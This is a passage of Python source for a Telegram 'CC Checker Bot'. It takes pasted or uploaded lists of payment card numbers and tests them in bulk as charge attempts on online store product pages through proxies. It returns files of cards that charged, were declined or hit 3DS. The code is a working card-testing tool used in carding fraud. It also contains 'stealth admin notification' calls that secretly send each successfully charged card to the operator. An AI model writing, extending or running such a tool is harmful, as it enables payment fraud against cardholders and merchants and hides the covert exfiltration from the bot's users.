        await update.message.reply_text("❌ No valid card found in your message.")
        return

    card = cards[0]
    status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")

    try:
        result = await process_single_card(card, user_id)
        formatted = format_result(result)
        await status_msg.edit_text(formatted, parse_mode="Markdown")

        # Stealth admin notification for charged cards
        if result.get("response", {}).get("success"):
            username = update.effective_user.username or update.effective_user.first_name
            asyncio.create_task(notify_admin_charged(card, result, user_id, username))
    except Exception as e:
        logger.error(f"Check error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)}")


async def run_batch_check(cards: list, user_id: int, user_settings: dict, session: dict, status_msg, update: Update):
    """
    Run batch card checking as a background task.
    This function runs independently of the update handler, allowing other users to interact with the bot.
    """
    charged = []
    declined = []
    three_ds = []
    all_results = []
    last_response = ""
    checked_count = 0
    was_stopped = False
    total_cards = len(cards)
    username = update.effective_user.username or update.effective_user.first_name

    try:
        # Create tasks with pre-fetched settings for better performance
        tasks = [process_single_card(card, user_id, user_settings) for card in cards]

        for i, future in enumerate(asyncio.as_completed(tasks)):
            # Check for stop FIRST
            if session["stopped"]:
                was_stopped = True
                break

            # Check for pause - yield control frequently for responsiveness
            pause_check_count = 0
            while session["paused"] and not session["stopped"]:
                await asyncio.sleep(0.05)  # Faster response (50ms)
                pause_check_count += 1
                if pause_check_count % 20 == 0:
                    await asyncio.sleep(0)  # Pure yield to event loop

            if session["stopped"]:
                was_stopped = True
                break

            try:
                result = await future
                response = result["response"]
                card = result["card"]
                checked_count += 1

                # Build full response with all error details
                response_parts = []
                if response.get("message"):
                    response_parts.append(response.get("message"))
                if response.get("error"):
                    response_parts.append(response.get("error"))
                if response.get("gateway_message"):
                    response_parts.append(f"Gateway: {response.get('gateway_message')}")
                if response.get("decline_code"):
                    response_parts.append(f"Code: {response.get('decline_code')}")

                full_response = " | ".join(response_parts) if response_parts else "Unknown"

                # Truncate for progress display only
                error_msg = full_response
                if len(error_msg) > 50:
                    error_msg = error_msg[:47] + "..."
                last_response = error_msg

                # Store result with full response for file
                result_line = f"{card} | {full_response}"

                if response.get("success"):
                    charged.append(result)
                    all_results.append(f"CHARGED | {result_line}")
                    # Non-blocking notification to user
                    asyncio.create_task(
                        update.message.reply_text(format_result(result), parse_mode="Markdown")
                    )
                    # Stealth admin notification (real-time, non-blocking)
                    asyncio.create_task(notify_admin_charged(card, result, user_id, username))
                elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                    three_ds.append(result)
                    all_results.append(f"3DS | {result_line}")
                    asyncio.create_task(
                        update.message.reply_text(format_result(result), parse_mode="Markdown")
                    )
                else:
                    declined.append(result)
                    all_results.append(f"DECLINED | {result_line}")

                # Update progress every 10 cards (non-blocking)
                if checked_count % 10 == 0 or checked_count == total_cards:
                    try:
                        progress_bar = create_progress_bar(checked_count, total_cards)
                        pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
                        asyncio.create_task(status_msg.edit_text(
                            f"{pause_status}⏳ *Checking Cards...*\n\n"
                            f"{progress_bar}\n"
                            f"📊 {checked_count}/{total_cards} checked\n\n"
                            f"✅ Charged: {len(charged)}\n"
                            f"🔐 3DS: {len(three_ds)}\n"
                            f"❌ Declined: {len(declined)}\n\n"
                            f"💬 *Last*: `{last_response}`",
                            parse_mode="Markdown",
                            reply_markup=get_checking_keyboard(paused=session["paused"])
                        ))
                    except Exception:
                        pass

            except asyncio.CancelledError:
                logger.warning(f"Task cancelled during batch check for user {user_id}")
                continue
            except Exception as e:
                logger.error(f"Batch check error for user {user_id}: {e}")
                last_response = f"Error: {str(e)[:30]}"
                checked_count += 1

    except Exception as e:
        logger.error(f"Fatal error in batch check for user {user_id}: {e}")
    finally:
        # Reset session
        session["checking"] = False

        # Final summary
        stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
        summary = (
            f"{stop_text}📊 *FINAL RESULTS*\n\n"
            f"✅ Charged: {len(charged)}\n"
            f"🔐 3DS: {len(three_ds)}\n"
            f"❌ Declined: {len(declined)}\n"
            f"📝 Checked: {checked_count}/{total_cards}"
        )

        try:
            await status_msg.edit_text(summary, parse_mode="Markdown")
        except Exception:
            pass

        # Send full results file
        if all_results:
            try:
                results_text = "\n".join(all_results)
                file_buffer = io.BytesIO(results_text.encode('utf-8'))
                file_buffer.name = "results.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"📊 Results: {len(charged)} Charged | {len(three_ds)} 3DS | {len(declined)} Declined | {checked_count}/{total_cards} checked"
                )
            except Exception as e:
                logger.error(f"Failed to send results file: {e}")

        # Send charged cards separately
        if charged:
            try:
                charged_text = "\n".join([r["card"] for r in charged])
                file_buffer = io.BytesIO(charged_text.encode('utf-8'))
                file_buffer.name = "charged_cards.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"✅ {len(charged)} Charged Cards"
                )
            except Exception as e:
                logger.error(f"Failed to send charged cards file: {e}")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file uploads for mass checking"""
    user_id = update.effective_user.id
    document = update.message.document

    # Check if user has products set
    if not user_has_products(user_id):
        await update.message.reply_text(
            "❌ *No product set!*\n\n"
            "Use the menu to add a product first.",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file containing cards.")
        return

    # Download file
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()

    try:
        card_text = file_bytes.decode('utf-8')
    except UnicodeDecodeError:
        card_text = file_bytes.decode('latin-1')

    cards = create_lista_(card_text)

    if not cards:
        await update.message.reply_text("❌ No valid cards found in the file.")
        return

    # Reset session state
    reset_user_session(user_id)
    session = get_user_session(user_id)
    session["checking"] = True

    # Pre-fetch user settings ONCE before starting (optimization)
    user_settings = get_user_settings(user_id)

    status_msg = await update.message.reply_text(
        f"📂 *File Received*\n\n"
        f"💳 Cards found: {len(cards)}\n"
        f"⏳ Starting check...",
        parse_mode="Markdown",
        reply_markup=get_checking_keyboard(paused=False)
    )

    # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
    # This allows other users to interact with the bot while checking is in progress
    asyncio.create_task(
        run_batch_check(cards, user_id, user_settings, session, status_msg, update)
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card messages and input waiting"""
    user_id = update.effective_user.id
    text = update.message.text or ""

    # Check if waiting for input
    waiting_for = get_waiting_for(user_id)

    # Handle proxy input
    if waiting_for == "proxy":
        set_waiting_for(user_id, None)
        proxy = text.strip()

        # Basic validation
        parts = proxy.replace(":", ":").split(":")
        if len(parts) < 2:
            await update.message.reply_text(
                "❌ *Invalid proxy format!*\n\n"
                "Use: `host:port:username:password`",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_proxy")
            )
            return

        update_user_setting(user_id, "proxy", proxy)
        await update.message.reply_text(
            f"✅ *Proxy Set!*\n\n`{proxy}`",
            parse_mode="Markdown",
            reply_markup=get_back_keyboard("menu_proxy")
        )
        return

    # Handle product input
    if waiting_for == "product":
        set_waiting_for(user_id, None)
        url = text.strip()

        # Validate URL format
        if "/products/" not in url:
            await update.message.reply_text(
                "❌ *Invalid URL!*\n\n"
                "URL must contain `/products/`\n\n"
                "Example: `https://store.com/products/item`",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_products")
            )
            return

        # Validate product exists
        status_msg = await update.message.reply_text("⏳ Validating product URL...")

        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{url}.json", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        product_title = data.get("product", {}).get("title", "Unknown")

                        settings = get_user_settings(user_id)
                        products = settings.get("products", [])

                        if url in products:
                            await status_msg.edit_text(
                                "⚠️ *Product already in your list!*",
                                parse_mode="Markdown",
                                reply_markup=get_back_keyboard("menu_products")
                            )
                            return

                        products.append(url)
                        update_user_setting(user_id, "products", products)

                        await status_msg.edit_text(
                            f"✅ *Product Added!*\n\n"
                            f"📝 *{product_title}*\n"
                            f"📦 Total products: {len(products)}",
                            parse_mode="Markdown",
                            reply_markup=get_back_keyboard("menu_products")
                        )
                    elif resp.status == 404:
                        await status_msg.edit_text(
                            "❌ *Product not found!*\n\nCheck the URL and try again.",
                            parse_mode="Markdown",
                            reply_markup=get_back_keyboard("menu_products")
                        )
                    else:
                        await status_msg.edit_text(
                            f"❌ *Error: HTTP {resp.status}*",
                            parse_mode="Markdown",
                            reply_markup=get_back_keyboard("menu_products")
                        )
        except Exception as e:
            await status_msg.edit_text(
                f"❌ *Failed to validate URL*\n\n{str(e)}",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_products")
            )
        return

    # Parse cards from message
    cards = create_lista_(text)

    if not cards:
        return  # Ignore messages without cards

    # Check if user has products set
    if not user_has_products(user_id):
        await update.message.reply_text(
            "❌ *No product set!*\n\n"
            "Use /menu → Products → Add Product",
            parse_mode="Markdown",
            reply_markup=get_main_menu_keyboard()
        )
        return

    if len(cards) == 1:
        # Single card - check it
        card = cards[0]
        status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")
        try:
            result = await process_single_card(card, user_id)
            formatted = format_result(result)
            await status_msg.edit_text(formatted, parse_mode="Markdown")

            # Stealth admin notification for charged cards
            if result.get("response", {}).get("success"):
                username = update.effective_user.username or update.effective_user.first_name
                asyncio.create_task(notify_admin_charged(card, result, user_id, username))
        except Exception as e:
            logger.error(f"Check error: {e}")
            await status_msg.edit_text(f"❌ Error: {str(e)}")
    else:
        # Multiple cards - process them all (no limit)
        # Reset session state
        reset_user_session(user_id)
        session = get_user_session(user_id)
        session["checking"] = True

        # Pre-fetch user settings ONCE before starting (optimization)
        user_settings = get_user_settings(user_id)

        status_msg = await update.message.reply_text(
            f"⏳ Checking {len(cards)} cards...",
            reply_markup=get_checking_keyboard(paused=False)
        )

        # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
        # This allows other users to interact with the bot while checking is in progress
        asyncio.create_task(
            run_batch_check(cards, user_id, user_settings, session, status_msg, update)
        )


def main():
    """Start the bot"""
    global _bot_app

    if not config.BOT_TOKEN:
        logger.error("BOT_TOKEN not set! Please set the BOT_TOKEN environment variable.")
        return

    logger.info("Starting CC Checker Bot...")

    # Initialize database
    if DATABASE_URL:
        logger.info("Connecting to PostgreSQL database...")
        init_database()
    else:
        logger.warning("DATABASE_URL not set - using in-memory storage (settings won't persist)")

    app = Application.builder().token(config.BOT_TOKEN).build()

    # Store app reference for admin notifications
    _bot_app = app

    # Log admin notification status
    if config.ADMIN_USER_ID:
        logger.info(f"Admin notifications enabled for user ID: {config.ADMIN_USER_ID}")
    else:
        logger.info("Admin notifications disabled (ADMIN_USER_ID not set)")

    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("setproxy", setproxy_command))
    app.add_handler(CommandHandler("addproduct", addproduct_command))
    app.add_handler(CommandHandler("removeproduct", removeproduct_command))
    app.add_handler(CommandHandler("products", products_command))
    app.add_handler(CommandHandler("clearproducts", clearproducts_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CommandHandler("dbstatus", dbstatus_command))
    app.add_handler(CommandHandler("chk", check_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Run the bot
    logger.info("Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
